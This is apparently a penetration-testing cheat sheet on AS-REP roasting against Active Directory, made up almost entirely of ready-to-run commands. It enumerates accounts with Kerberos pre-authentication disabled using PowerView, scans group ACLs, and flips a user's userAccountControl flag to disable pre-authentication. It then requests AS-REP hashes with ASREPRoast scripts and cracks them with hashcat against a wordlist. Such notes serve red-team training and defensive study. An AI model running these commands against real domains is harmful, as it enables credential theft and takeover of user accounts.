# 🟢 AS-REPS Roasting

```
. .\Powerview_dev.ps1
```

### **Enumerating accounts with Kerberos pre-auth disabled**

```
Get-DomainUser -PreauthNotRequired -Verbose
```

```
Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
```

**Enumerate permissions for group**

{% code overflow="wrap" %}
```
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
```
{% endcode %}

### **Set pre-auth not required**

```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

### **Request encrypted AS-REP**

```
. ./ASREPRoast.ps1
Get-ASREPHash -Username <username> -Verbose
```

### **Enumerate all users with Kerberos pre-auth disabled and request a hash**

```
Invoke-ASREPRoast -Verbose
Invoke-ASREPRoast -Verbose | fl
```

**Crack the hash with hashcat**

```
Hashcat -a 0 -m 18200 hash.txt rockyou.txt
```
